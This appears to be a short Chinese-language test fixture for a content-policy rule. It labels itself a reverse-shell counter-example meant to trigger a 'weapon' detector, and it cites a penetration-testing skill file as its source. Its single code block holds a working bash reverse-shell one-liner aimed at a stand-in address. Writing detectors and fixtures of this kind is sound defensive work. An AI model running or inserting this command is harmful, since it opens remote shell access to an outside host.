<!-- dsh-redblue:provenance
source-repo: https://github.com/usestrix/strix
source-commit: 8db295a5b3564be2b430bb3a9afdb4db7850fa24
source-license: Apache-2.0
source-path: skills/penetration-testing-with-strix/SKILL.md
last-verified: 2026-11-19
rewrite-summary: 保留证据标准与复现结构，删除运行时依赖与真实目标
-->

# 反弹 shell 反例

以下代码块用于触发 R3-WEAPON；真实文档不得出现可直接执行的武器化命令。

```bash
bash -i >& /dev/tcp/192.0.2.10/443 0>&1
```
